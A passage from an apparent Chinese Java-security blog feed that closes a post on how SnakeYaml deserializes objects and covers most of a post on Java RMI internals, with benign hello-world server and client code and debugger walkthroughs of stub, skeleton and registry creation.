src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113136.png"></p><p>通过<code>F7</code>跟进到<code>this.constructObjectNoCheck()</code>中，先判断了<code>recursiveObjects</code>集合里面是否已经包含了相应的节点，没有则继续执行；有则抛出异常；这里是没有，进入<code>else</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113201.png"></p><p>进入<code>else</code>以后，先来将<code>node</code>加入到<code>recursiveObjects</code>集合中，然后再获取<code>node</code>相应的构造函数，这里获取到的是默认的 <code>yaml</code>的构造函数，然后就进入对象构造中；</p><p>我们跟进<code>constructor.construct(node)</code>中，来到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113622.png"></p><p>继续跟进<code>getConstructor(node)</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113864.png"></p><p>然后再跟进<code>getClassForNode</code>，在这个函数中，现根据 tag 取出 className 为目标类，然后调用</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113489.png"></p><p>跟进<code>getClassForName</code>，根据获取到的User类名来调用<code>Class.forName()</code>即通过反射的方式来获取目标类User</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113514.png"></p><p>知道了上述内容之后，我们从下图位置，就是刚才进入 getConstructor(node) 的地方跟进<code>construct(node)</code>函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113160.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113228.png"></p><p>在这个函数中，通过调用<code>newInstance</code>构造了一个 User 对象，目前已经完成了类的实例化，接下来就是进行对象属性的赋值操作；</p><p>跟进<code>this.constructJavaBean2ndStep(mnode, obj)</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113980.png"></p><p><font style="color:rgb(32, 32, 32);">其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的User对象的属性值,跟进上述的 set 方法；</font></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113402.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071113959.png"></p><p><font style="color:rgb(32, 32, 32);">属性值设置完成后，就返回新建的含有属性值的User类对象了。</font></p><p><font style="color:rgb(32, 32, 32);">整个SnakeYaml反序列化的过程就这样。</font></p><h2 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h2><p>SnakeYaml 在反序列化的过程中，首先回提取处序列化的字符串，判断其 tag 是否是 Tag.PREFIX 即”tag:yaml.org,2002:”，是的话进行UTF-8编码并返回该类名；</p><p>然后通过反射调用相应类的构造函数进行对象的实例化，然后对对象的属性调用 set 方法进行复制；</p><p>以上就是整个反序列化的过程，由于需要实例化对象和对象属性的赋值，因此需要调用构造函数和相应属性的 setter 方法；</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#SnakeYaml%E7%AE%80%E4%BB%8B">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#SnakeYaml%E7%AE%80%E4%BB%8B</a></li><li><a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E7%AE%80%E4%BB%8B">https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E7%AE%80%E4%BB%8B</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>SnakeYaml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI基础</title>
    <link href="/2024/12/06/RMI%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/12/06/RMI%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、RMI前言介绍"><a href="#一、RMI前言介绍" class="headerlink" title="一、RMI前言介绍"></a>一、RMI前言介绍</h1><p>RMI作为后续漏洞中最为基础的利用手段之一，非常需要进行学习和深入理解。<br>需要注意的是：</p><ul><li>影响版本：&lt;&#x3D;jdk8u121；</li><li>原因：&gt;jdk8u121，bind、rebind、unbind三个方法只能对localhost进行攻击；</li></ul><h1 id="二、RMI基础"><a href="#二、RMI基础" class="headerlink" title="二、RMI基础"></a>二、RMI基础</h1><h2 id="2-1-RMI介绍"><a href="#2-1-RMI介绍" class="headerlink" title="2.1 RMI介绍"></a>2.1 RMI介绍</h2><p>RMI 全称 Remote Method Invocation（远程方法调用）：在一个 JVM 中 Java 程序调用在另一个<font style="background-color:#f3bb2f;">远程 JVM</font> 中运行的 Java 程序，这个远程 JVM 既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p><p>RMI 依赖的通信协议为 <font style="background-color:#f3bb2f;">JRMP</font>(Java Remote Message Protocol，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。</p><blockquote><p> JRMP协议如HTTP协议一样，规定了客户端和服务端要满足的规范</p></blockquote><ul><li>RMI包括以下三个部分<img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412062249768.png"></li><li>Server服务端：服务通过绑定远程对象，这个对象可以封装很多网络操作，也就是Socket</li><li>Client客户端：客户端调用服务端的方法</li></ul><p>因为有了C&#x2F;S的交互，而且Socket是对应端口的，这个端口是动态的，所以这里引进了第三个RMI的部分——Registry部分</p><ul><li>Registry注册端：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li></ul><h2 id="2-2-RMI的实现"><a href="#2-2-RMI的实现" class="headerlink" title="2.2 RMI的实现"></a>2.2 RMI的实现</h2><p>这里为了便于理解，将服务端和客户端分为两个模块进行编写。</p><h3 id="服务端RMI-Server"><a href="#服务端RMI-Server" class="headerlink" title="服务端RMI_Server"></a>服务端RMI_Server</h3><p>首先定义一个远程接口，其中定义一个sayHello()的方法</p><ul><li>RemoteObj.java(<strong>编写一个远程接口，其中定义了一个 sayHello() 的方法</strong>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">public interface RemoteObj extends Remote &#123;<br>    public String sayHello(String keywords) throws RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求：</p><ol><li>此远程接口要求作用域为public</li><li>继承Remote接口；</li><li>让其中的接口方法抛出异常；</li></ol><ul><li>RemoteObjImpl.java(<strong>定义该接口的实现类 Impl</strong>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj &#123;<br>    public RemoteObjImpl() throws RemoteException &#123;<br><br>    &#125;<br><br>    @Override<br>    public String sayHello(String keywords) throws RemoteException &#123;<br>        String upKeywords = keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        return upKeywords;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求：</p><ol><li>实现远程接口</li><li>继承UnicastRemoteObject类，用于生成Stub(存根)和Skeleton(骨架)。</li><li>构造函数需要抛出一个RemoteException错误</li><li>实现类中的对象必须都可序列化，即都继承<code>java.io.Serializeable</code></li></ol><ul><li>RMIServer.java(<strong>注册远程对象</strong>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RMIServer &#123;<br>    public static void main(String[] args) throws RemoteException &#123;<br>        RemoteObj remoteObj = new RemoteObjImpl();<br>        Registry registry = LocateRegistry.createRegistry(1099);<br>        registry.rebind(&quot;remoteObj&quot;, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>port默认是1099端口，不写会自动补上，其他端口必须写；</p><p>bind的绑定，只要和客户端去查找的registry一致即可</p><hr><h3 id="客户端RMI-Client"><a href="#客户端RMI-Client" class="headerlink" title="客户端RMI_Client"></a>客户端RMI_Client</h3><p>客户端需要从注册器中获取远程对象，然后调用方法。当客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><ul><li>RemoteObj.java(<strong>编写一个接口，定义远程对象类型</strong>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">public interface RemoteObj extends Remote &#123;<br>    public String sayHello(String keywords) throws RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>RMIClient.java(<strong>编写客户端的代码，获取远程对象，并调用方法</strong>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RMIClient &#123;<br>    public static void main(String[] args) throws RemoteException, NotBoundException &#123;<br>        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);<br>        RemoteObj remoteObj = (RemoteObj)registry.lookup(&quot;remoteObj&quot;);<br>        remoteObj.sayHello(&quot;hello&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们就能够从远端服务端中调用RemoteHelloWorld对象的sayHello()方法了。</p><h1 id="三、从Wireshark抓包分析RMI通信原理"><a href="#三、从Wireshark抓包分析RMI通信原理" class="headerlink" title="三、从Wireshark抓包分析RMI通信原理"></a>三、从Wireshark抓包分析RMI通信原理</h1><p>在这里直接说明RMI的通信原理，详细的分析流程可以参考<a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/#0x03-%E4%BB%8E-Wireshark-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90-RMI-%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86">从Wireshark抓包分析RMI通信原理</a></p><p>在客户端远程调用Java程序的过程中其实建立了两次TCP连接，第一次连接是连接1099端口；第二次连接是由服务端发送给客户端的。</p><ul><li>第一次连接：客户端连接Registry在其中寻找Name为hello的对象，这个对应数据流中的Call消息，然后Registry返回一个序列化的数据，这个就是找到的<code>Name=Hello</code>的对象，这个对应数据流中的ReturnData消息。</li><li>第二次连接：服务端发送给客户端的Call消息客户端反序列化该对象，发现该对象是一个远程对象，地址在<code>ip:port</code>，于是再与这个地址建立TCP连接；在这个新的连接中，才执行真正的远程方法调用，也就是<code>sayHello()</code></li></ul><p>总的来说，RMI Registry就像一个网关，他自己是不会执行远程方法的，但RMI Server可以在上面注册一个Name到对象的绑定关系；RMI Client通过Name像RMI Registry查询，得到这个绑定关系，然后再连接RMI Server。最后，远程方法实际上在RMI Server上调用。</p><p>原理如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272051111.png"></p><p>至此，我们可以确定RMI是一个基于序列化的Java远程方法调用机制。</p><h1 id="四、从IDEA断点分析RMI通信原理"><a href="#四、从IDEA断点分析RMI通信原理" class="headerlink" title="四、从IDEA断点分析RMI通信原理"></a>四、从IDEA断点分析RMI通信原理</h1><h2 id="4-1-流程分析总览"><a href="#4-1-流程分析总览" class="headerlink" title="4.1 流程分析总览"></a>4.1 流程分析总览</h2><p>首先RMI有三部分：</p><ol><li>RMI Registry</li><li>RMI Server</li><li>RMI Client</li></ol><p>如果两两通信就是 3+2+1 &#x3D; 6 个交互流程，还有三个创建过程，一共是九个过程。</p><p>RMI 的工作原理可以大致参考这张图<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272059732.png"></p><h2 id="4-2-创建远程服务"><a href="#4-2-创建远程服务" class="headerlink" title="4.2 创建远程服务"></a>4.2 创建远程服务</h2><blockquote><p>声明：创建远程服务其实并不存在任何漏洞</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272203150.png"></p><p>断点打在RMI_Server的创建远程对象上，如上图所示；</p><h3 id="4-2-1-发布远程对象"><a href="#4-2-1-发布远程对象" class="headerlink" title="4.2.1 发布远程对象"></a>4.2.1 发布远程对象</h3><p>开始调试，首先是远程对象的构造函数<code>RemoteObjImpl</code>，现在我们要把它发布到网络上，分析的是<strong>它如何被发布到网络上去的</strong></p><p><code>RemoteObjImpl</code>这个类是继承于<code>UnicastRemoteObject</code>的，所以先会到父类的构造函数，父类的构造函数这里的port传入0，它代表了一个随机端口。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272211894.png"></p><blockquote><p>这个过程不同于注册中心的1099端口，这是远程服务的。</p></blockquote><p>远程服务这里如果传入的是0，它会被发布到网络上的一个随机端口。继续往下看，先F8到<code>exportObject()</code>，在F7步入进去查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">public static Remote exportObject(Remote obj, int port) throws RemoteException<br>&#123;<br>    return exportObject(obj, new UnicastServerRef(port));<br>&#125;<br></code></pre></td></tr></table></figure><p><code>exportObject()</code>是一个静态函数，它就是主要负责<strong>将远程服务发布到网络上</strong><br>如何更好的理解<code>exportObject()</code>的作用？<br>如果不继承<code>UnicastRemoteObject</code>这个类的话，可以通过手动调用函数实现相对应的功能。For example：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RemoteObjImpl implements RemoteObj &#123;<br>    public RemoteObjImpl() throws RemoteException &#123;<br>        UnicastRemoteObject.exportObject(this, 0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次回到<code>exportObject()</code>这个静态函数，第一个参数是<code>obj</code>对象，第二个参数是<code>new UnicastServerRef(port)</code>，第二个参数是用来处理网络请求的。<br>继续向里跟进F7，来到<code>UnicastServerRef</code>的构造函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272245105.png"></p><p>在<code>UnicastServerRef</code>的构造函数，我们看到它new了一个LiveRef(port)，它算是一个网络引用的类，继续跟进查看。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272247371.png"></p><p>先是一个构造函数，在继续跟进this查看</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272248779.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">public LiveRef(ObjID objID, int port) &#123;<br>    this(objID, TCPEndpoint.getLocalEndpoint(port), true);<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个参数<code>ID</code>，第三个参数为<code>true</code>，所以我们重点关注一下第二个参数。<br><code>TCPEndpoint</code>是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个IP与一个端口，也就是说传进入一个IP和一个端口，就可以进行网络请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">public TCPEndpoint(String host, int port) &#123;<br>    this(host, port, null, null);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续F7跟进LiveRef的构造函数this里面</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272254583.png"></p><p>这时候我们可以看一下一些赋值，发现host和port是赋值到了endpoint里面，而endpoint又是被封装在LiveRef里面的，所以记住数据实在LiveRef里面即可，并且这一LiveRef至始至终只存在一个。</p><p>上述即是LiveRef创建的过程，继续F7跟进会再回到之前出现<code>LiveRef(port)</code>的地方</p><hr><p>继续F7跟进super看一看父类<code>UnicastRef</code>，这里就证明整个<strong>创建远程服务</strong>的过程只会存在一个LiveRef。一路F7到一个静态函数<code>exportObject()</code>，后续的操作过程都与<code>exportObject()</code>有关，基本都是再调用它，这一段不是很重要，一路F7就好。直到此处出现Stub</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272306080.png"></p><p>再服务端创建远程服务这一步居然出现了stub的创建（其实也就是一个代理对象），其实原理是这个样子的，来结合上述我们提到的原理图进行讲解：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272059732.png"></p><ul><li>RMI现在Service的地方，也就是服务端创建一个Stub，再把Stub传到RMI Registry中，最后让RMI Client去获取Stub。</li></ul><blockquote><p>接着我们研究Stub产生的这一步，先进到createProxy这个方法里面</p></blockquote><p>先进行了基本的复制，然后继续F8往下看，去到判断的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272313298.png"></p><p>这个判断暂时不用管，后续我们会碰到，那个时候再讲。<br>再往下走，我们可以看到这是很明显的类加载的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272317140.png"></p><p>第一个参数是AppClassLoader，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个ref，它也是和之前我们看到的ref是同一个，创建远程服务当中永远只有一个ref，那就是(LiveRef)。</p><p>在此处就把远程服务的动态代理创建好了，如图Stub。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272323567.png"></p><p>继续F7跟到Target这里，Target这里相当于一个总的封装，将所有用的东西放到Target里面，我们可以进去看一看里面都放了什么。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272326897.png"></p><p>通过比较ID可以知道在disp、stub中的ref是同一个，且ID值与存储在id中的值相同。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409272333677.png"></p><p>一路F8，回到之前的Target定义的位置，下一条语句是<code>ref.exportObject(target)</code>，也就是把target这个封装好的对象发布出去。</p><p>F7跟进exportObject查看发布逻辑，跟进到如下图位置</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281032751.png"></p><p>此处的第一条语句listen()，真正处理网络请求，继续跟进查看逻辑。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281040612.png"></p><p>跟进之后，可以知道其运行逻辑。<br>先获取了TCPEndpoint，然后到<code>server = ep.newServerSocket();</code>创建了一个新的socket，等待连接，所以之后再Thread里面去做完成连接之后的事儿。</p><p>来到<code>NewServerSocket()</code>函数中可以发现，当listenPort端口等于0的时候，会设置一个默认端口。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281048983.png"></p><p>下面贴上线程中执行任务的图示</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281111169.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281112774.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281112437.png"></p><p>这里就是比较常见的Socket连接请求的处理流程，</p><p>一路执行回到exportObject()中可以发现，target里面的port变量已经被赋值。意味着刚才的<code>NewServerSocet()</code>函数确实已经对port端口进行赋值。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281052844.png"></p><h3 id="4-2-2-发布完成之后的记录"><a href="#4-2-2-发布完成之后的记录" class="headerlink" title="4.2.2 发布完成之后的记录"></a>4.2.2 发布完成之后的记录</h3><p>其实经过上述的操作之后就已经完成了发布stub，继续向下查看一下记录；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281222342.png"></p><p>从这里F7跟进内部查看远程服务被记录到什么地方。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281224027.png"></p><p>第一个语句<code>target.setExportedTransport(this);</code>是一个简单的赋值，可以不看；<br>第二个语句<code>ObjectTable.putTarget(target);</code>继续跟入；前面都是一些简单的赋值语句，调用的put函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281532336.png"></p><p>RMI这里会把所有的信息保存到<strong>两个table</strong>里面，从而形成相应的表进行记录(其实就是一个Map)，应该是可以简单理解为一个日志的。</p><h3 id="4-2-3-创建远程服务小结"><a href="#4-2-3-创建远程服务小结" class="headerlink" title="4.2.3 创建远程服务小结"></a>4.2.3 创建远程服务小结</h3><p>从个人理解的角度来说，发布远程对象，就是通过<code>exportObject()</code>指定到发布的IP与端口，端口为随机端口。</p><p>至始至终复杂的地方其实都是再赋值，创建类、进行各种各样的封装，真正实现功能的代码还是比较短的，即<code>listen()</code>；以及创建线程开始执行监听；</p><p>还有一个过程就是发布完成之后的记录，类似于日志，这些记录时保存到静态的HashMap当中。</p><p>创建远程服务这部分的内容基本就是这样，事实上并不存在漏洞；</p><h2 id="4-3-创建注册中心-绑定"><a href="#4-3-创建注册中心-绑定" class="headerlink" title="4.3 创建注册中心+绑定"></a>4.3 创建注册中心+绑定</h2><p>创建注册中心与服务端是独立的，所以谁先谁后其实没有什么关系，本质上都是一整个东西；断点打在<code>Registry registry = LocateRegistry.createRegistry(1099);</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281546410.png"></p><h3 id="4-3-1-创建注册中心"><a href="#4-3-1-创建注册中心" class="headerlink" title="4.3.1 创建注册中心"></a>4.3.1 创建注册中心</h3><p>首先从断点<code>createRegistry()</code>函数中通过F7跟进函数内部查看其详细内容。第一步是创建一个<code>RegistryImpl</code>对象，继续跟进到<code>RegistryImpl</code>构造当中。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281553692.png"></p><p>在这个构造函数当中，首先会判断传入的端口<code>port</code>是否已经是注册中心的端口以及进行一系列的安全检查判断（不重要）。继续F8往下走……</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281558454.png"></p><p>可以发现其创建了一个LiveRef对象，id参数值不明，但是port是我们的注册中心端口1099；并且创建了一个<code>UnicastServerRef</code>对象，这段代码和我们么那上面讲的<font style="background-color:#f3bb2f;">创建远程对象</font>比较类似，可以继续跟进查看一下<code>setup()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281601598.png"></p><p>发现其实跟创建远程对象的原理相似，先赋值，然后再进行<code>exportObject()</code>方法的调用。</p><blockquote><p>区别在于<code>第三个参数的不同</code><br>创建远程对象中为<code>true</code>，代表创建一个临时对象；<br>创建注册中心中为<code>false</code>，代表创建注册一个永久对象；</p></blockquote><p>然后再通过F7跟进<code>exportObject()</code>函数查看一下函数的实现细节；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281606090.png"></p><p>发现其实跟发布远程对象中的<code>exportObject()</code>差不多，来到创建Stub的阶段；继续跟进Stub的详细创建的过程中<code>createProxy()</code>；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281612066.png"></p><p>Stub创建过程中的判断与创建远程对象服务中存在差异，就是就在于<code>stubClassExists()</code>判断的存在，继续跟进该判断函数中</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281615450.png"></p><p>我们看到这个地方，是判断是否能获取到 <code>RegistryImpl_Stub</code> 这个类，换句话说，也就是若 <code>RegistryImpl_Stub</code> 这个类存在，则返回 True，反之 False。我们可以找到 <code>RegistryImpl_Stub</code> 这个类是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281629923.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281629591.png"></p><p>对比<strong>发布远程对象</strong>那个步骤，创建注册中心是走进到 <code>createStub(remoteClass, clientRef);</code> 进去的，而<strong>发布远程对象</strong>则是直接创建动态代理的。继续F7跟入<code>createStub()</code>中</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281630045.png"></p><p>直接通过反射调用构造函数创建对象，里面放置的内容即ref。一路F8执行代码来到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281634689.png"></p><p>如果服务端是定义好的，就调用<code>setSkeleton()</code>方法，跟进去</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281637452.png"></p><p>存在一个<code>createSkeleton()</code>方法，从函数名可以看出是用来创建<code>Skeleton</code>的。在RMI原理流程图中，Skeleton是作为服务端的代理使用的。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281641472.png"></p><p>查看一下<code>createSkeleton()</code>函数源码，发现<code>Skeleton</code>是用<code>forName()</code>的方式创建的，如图。继续F8执行，来到下图</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281644399.png"></p><p>发现此处比发布远程服务对象多了<code>skel</code>，又到了Target的位置，Target部分的作用与发布远程服务的作用一致，用于存储封装数据；接下来的<code>exportObject()</code>的作用基本与前面分析的一致。<code>listen()</code>线程监听等待接收<code>socket</code>连接。F7跟进后，再次来到这个位置即可</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281655103.png"></p><p>继续F8到<code>super.exportObject(target);</code>然后F7跟进查看相关内容即可；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281657498.png"></p><p>这里存在一个<code>putTarget()</code>方法，它会将target的数据封装并放进去。继续F7跟进查看；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409281659359.png"></p><p>执行的代码基本上与创建远程服务一致，但是还需要详细查看一下封装了哪些数据。</p><h3 id="4-3-2-查看封装了哪些数据进去"><a href="#4-3-2-查看封装了哪些数据进去" class="headerlink" title="4.3.2 查看封装了哪些数据进去"></a>4.3.2 查看封装了哪些数据进去</h3><p>查看 static 中的数据，点开 <code>objTable</code> 中查看三个 Target，我们逐个分析一下，分析的话主要还是看 ref<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071015529.png"></p><p>我们现在可以关注到这里总共有三个Target，我们逐一分析其中存储的内容；</p><ul><li>Target@844</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071018294.png"></p><p>可以知道这是DGCImpl_Stub，是分布式垃圾回收的一个对象；它并不是我们刚才创建的。这个东西挺重要的。</p><ul><li>Target@789</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412062250824.png"></p><p>可以发现这里存储的是<code>$proxy</code>对象，具体信息如上图所示；</p><ul><li>Target@880</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071022939.png"></p><p>可以发现这个target中应该是存储了我们创建的服务中心信息，包括监听端口等等；</p><h3 id="4-3-3-绑定"><a href="#4-3-3-绑定" class="headerlink" title="4.3.3 绑定"></a>4.3.3 绑定</h3><blockquote><p>现在来到了RMI服务端的最后一步，也就是bind绑定操作；</p></blockquote><p>下断点在绑定语句进行调试分析；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071031116.png"></p><p>这里可能不能直接通过F7跟进，可以找到<code>RegistryImpl#bind()</code>下一个断点进来，通过F7跟进，来到<code>bind()</code>方法的具体实现</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071030167.png"></p><p>继续F7根据到检查函数<code>checkAccess()</code>的具体实现</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071033962.png"></p><p>F8执行跳出该函数，回到<code>bind()</code>函数中</p><p><img 